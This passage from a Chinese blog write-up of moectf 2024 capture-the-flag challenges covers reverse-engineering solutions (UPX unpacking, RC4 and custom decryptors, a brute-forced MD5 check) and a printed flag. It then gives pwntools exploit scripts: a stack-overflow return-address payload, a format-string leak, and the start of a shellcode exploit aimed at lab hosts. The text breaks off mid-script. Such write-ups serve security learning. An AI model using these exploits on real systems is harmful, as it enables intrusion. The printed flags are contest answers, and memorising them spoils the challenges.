upx</h2><p>先使用upx工具先脱壳，再进行ida的正常阅读</p><p>里面直接由flag</p><p><strong>moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}</strong></p><h2 id="upx-revenge"><a class="markdownIt-Anchor" href="#upx-revenge"></a> upx-revenge</h2><p>ESP x64dbg手动脱壳一下用ida64打开得到flag</p><p><img src="/../../images/moectf/moectf2024/upx-renvenge.png" alt="upx-renvenge"></p><h2 id="dynamic"><a class="markdownIt-Anchor" href="#dynamic"></a> dynamic</h2><p>下载打开文件，按shift+f12找到对应的页面，找到what happened to my flag?</p><p>里面有一段逻辑进行REencrypto之后就变了，给what那行打断点，f9动调得到flag</p><p><img src="/../../images/moectf/moectf2024/dynamic.png" alt="dynamic"></p><h2 id="d0tn3t"><a class="markdownIt-Anchor" href="#d0tn3t"></a> d0tN3t</h2><p>用dnSpy打开定位到关键代码，然后写解密脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; array = &#123;<br>        <span class="hljs-number">173</span>, <span class="hljs-number">146</span>, <span class="hljs-number">161</span>, <span class="hljs-number">174</span>, <span class="hljs-number">132</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">234</span>, <span class="hljs-number">231</span>, <span class="hljs-number">244</span>,<br>        <span class="hljs-number">177</span>, <span class="hljs-number">161</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span>, <span class="hljs-number">18</span>, <span class="hljs-number">12</span>, <span class="hljs-number">166</span>, <span class="hljs-number">247</span>, <span class="hljs-number">229</span>, <span class="hljs-number">207</span>,<br>        <span class="hljs-number">125</span>, <span class="hljs-number">109</span>, <span class="hljs-number">67</span>, <span class="hljs-number">180</span>, <span class="hljs-number">230</span>, <span class="hljs-number">156</span>, <span class="hljs-number">125</span>, <span class="hljs-number">127</span>, <span class="hljs-number">182</span>, <span class="hljs-number">236</span>,<br>        <span class="hljs-number">105</span>, <span class="hljs-number">21</span>, <span class="hljs-number">215</span>, <span class="hljs-number">148</span>, <span class="hljs-number">92</span>, <span class="hljs-number">18</span>, <span class="hljs-number">199</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">38</span>,<br>        <span class="hljs-number">228</span>, <span class="hljs-number">55</span>, <span class="hljs-number">62</span>, <span class="hljs-number">164</span><br>    &#125;;<br><br>    std::string flag;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">char</span> decrypted_char = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">char</span>&gt;((array[i] ^ (i * i)) ^ <span class="hljs-number">114</span>) - <span class="hljs-number">114</span>;<br>        flag += decrypted_char;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decrypted Flag: &quot;</span> &lt;&lt; flag &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="逆向工程进阶指北"><a class="markdownIt-Anchor" href="#逆向工程进阶指北"></a> 逆向工程进阶指北</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* arr)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">33</span>; j &lt;= <span class="hljs-number">126</span>; j++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">33</span>; k &lt;= <span class="hljs-number">126</span>; k++)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-number">33</span>; l &lt;= <span class="hljs-number">126</span>; l++)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">33</span>; m &lt;= <span class="hljs-number">126</span>; m++) &#123;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp[] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)k, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)l, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)m &#125;;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)temp;<br>                    <span class="hljs-keyword">if</span> (((*p * <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>) == arr[i]) &#123;<br>                        cout &lt;&lt; (<span class="hljs-type">char</span>)j &lt;&lt; (<span class="hljs-type">char</span>)k &lt;&lt; (<span class="hljs-type">char</span>)l &lt;&lt; (<span class="hljs-type">char</span>)m;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 返回-1表示没有找到匹配的字符组合</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> arr[] = &#123;<br>        <span class="hljs-number">0xb5073388</span>, <span class="hljs-number">0xf58ea46f</span>, <span class="hljs-number">0x8cd2d760</span>, <span class="hljs-number">0x7fc56cda</span>,<br>        <span class="hljs-number">0x52bc07da</span>, <span class="hljs-number">0x29054b48</span>, <span class="hljs-number">0x42d74750</span>, <span class="hljs-number">0x11297e95</span>,<br>        <span class="hljs-number">0x5cf2821b</span>, <span class="hljs-number">0x747970da</span>, <span class="hljs-number">0x64793c81</span><br>    &#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">find</span>(i, arr) == <span class="hljs-number">-1</span>) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;No match found for arr[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="secretmodule"><a class="markdownIt-Anchor" href="#secretmodule"></a> SecretModule</h2><p>下载得到文件，<a href="http://xn--customize-9q1rq60at08d.sh">打开看customize.sh</a>，提示base64，解密后下载文件，得到以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">testk</span></span>() &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-built_in">return</span> 1<br>  <span class="hljs-built_in">return</span> 0<br>&#125;   <br><br><span class="hljs-function"><span class="hljs-title">choose</span></span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    /system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>    <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUME &gt;/dev/null`); <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br>  <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUMEUP &gt;/dev/null`); <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-keyword">if</span> testk; <span class="hljs-keyword">then</span><br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br><span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br>concatenated=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2 3 4 5 6 7<br><span class="hljs-keyword">do</span><br>  result=$(choose)<br>  concatenated=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;concatenated&#125;</span><span class="hljs-variable">$&#123;result&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br><br>input_str=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$concatenated</span> | <span class="hljs-built_in">md5sum</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;moectf&#123;<span class="hljs-variable">$concatenated</span>&#125;&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>gpt帮帮我，写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><span class="hljs-comment"># 目标哈希值</span><br>target_hash = <span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><br><span class="hljs-comment"># 定义两个可能的结果</span><br>options = [<span class="hljs-string">&quot;114514&quot;</span>, <span class="hljs-string">&quot;1919810&quot;</span>]<br><span class="hljs-comment"># 枚举所有可能的组合，7个位置，每个位置有两个可能的选择</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(options, repeat=<span class="hljs-number">7</span>):<br>    <span class="hljs-comment"># 组合成一个字符串</span><br>    concatenated = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    <span class="hljs-comment"># 计算其 MD5 哈希值</span><br>    hashed = md5_hash(concatenated)<br><br>    <span class="hljs-comment"># 如果哈希值匹配目标</span><br>    <span class="hljs-keyword">if</span> hashed == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到匹配的输入序列: <span class="hljs-subst">&#123;combo&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入字符串: <span class="hljs-subst">&#123;concatenated&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag 是: moectf&#123;&#123;<span class="hljs-subst">&#123;concatenated&#125;</span>&#125;&#125;&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="rc4"><a class="markdownIt-Anchor" href="#rc4"></a> rc4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> longULONG;<br><span class="hljs-comment">/*初始化函数*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[i]和s[j]</span><br>        s[j] = tmp;<br>    &#125;<br>&#125; <br><span class="hljs-comment">/*加解密*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k&lt;Len; k++)<br>    &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[x]和s[y]</span><br>        s[j] = tmp;<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[]=<br>    &#123;<br>      <span class="hljs-number">0xA7</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0x9B</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xCE</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xD4</span>,<br> <span class="hljs-number">0xBC</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0x8A</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0xD6</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0xF8</span>,<span class="hljs-number">0xA4</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0xE0</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0xB9</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x11</span><br>    &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;RC4_1s_4w3s0m3&quot;</span>;<br>    <span class="hljs-type">unsigned</span>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">rc4_init</span>(s,key,<span class="hljs-number">14</span>);<br>    <span class="hljs-built_in">rc4_crypt</span>(s,flag,<span class="hljs-number">42</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">42</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[i]);<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="二进制漏洞审计"><a class="markdownIt-Anchor" href="#二进制漏洞审计"></a> 二进制漏洞审计</h1><h2 id="二进制漏洞审计入门指北"><a class="markdownIt-Anchor" href="#二进制漏洞审计入门指北"></a> 二进制漏洞审计入门指北</h2><p>nc连接一下就出来了</p><h2 id="notenoughtime"><a class="markdownIt-Anchor" href="#notenoughtime"></a> NotEnoughTime</h2><p>是个数学题，写个脚本交互一下吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>(<span class="hljs-params">io</span>):<br>    <span class="hljs-comment"># 初始交互，发送设置值</span><br>    io.recvuntil(<span class="hljs-string">b&quot;ones.&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 进入到数学表达式部分</span><br>    io.recvuntil(<span class="hljs-string">b&#x27;PREPARED!&#x27;</span>)<br>    a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 循环处理数学表达式</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 清理接收到的表达式，移除空白字符并替换除法符号</span><br>        aa = re.sub(<span class="hljs-string">r&#x27;[ \t\n\r=]+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, a.decode()).replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 计算表达式的结果</span><br>        ans = <span class="hljs-built_in">eval</span>(aa)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Calculated Answer: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 将计算结果发送回服务器</span><br>        io.sendline(<span class="hljs-built_in">str</span>(ans).encode())<br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 接收下一个表达式</span><br>            a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">except</span> EOFError:<br>            <span class="hljs-comment"># 如果没有更多表达式则跳出循环</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 连接到远程服务，端口为62593</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63631</span>)<br><br><span class="hljs-comment"># 执行工作函数</span><br>work(io)<br><br><span class="hljs-comment"># 保持交互</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="no_more_gets"><a class="markdownIt-Anchor" href="#no_more_gets"></a> no_more_gets</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">io</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;out.&#x27;</span>)  <span class="hljs-comment"># 接收直到指定字符串</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x40101a</span>) + p64(<span class="hljs-number">0x401176</span>)  <span class="hljs-comment"># 构造 payload</span><br>    io.sendline(payload)  <span class="hljs-comment"># 发送 payload</span><br><br><span class="hljs-comment"># 使用正确的 IP 地址</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63945</span>)  <span class="hljs-comment"># 建立远程连接</span><br>exp(io)  <span class="hljs-comment"># 执行 exp 函数</span><br>io.interactive()  <span class="hljs-comment"># 进入交互模式</span><br></code></pre></td></tr></table></figure><h2 id="leak_sth"><a class="markdownIt-Anchor" href="#leak_sth"></a> leak_sth</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;192.168.114.1&quot;</span>,<span class="hljs-number">56731</span>)<br>payload=<span class="hljs-string">b&quot;%7$p&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;Your name:\n0x&quot;</span>)<br>data=p.recv(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data=&quot;</span>,data)<br>data=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data2=&quot;</span>,<span class="hljs-built_in">hex</span>(data))<br>p.sendline(<span class="hljs-built_in">str</span>(data))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="这是什么shellcode"><a class="markdownIt-Anchor" href="#这是什么shellcode"></a> 这是什么？shellcode！</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span 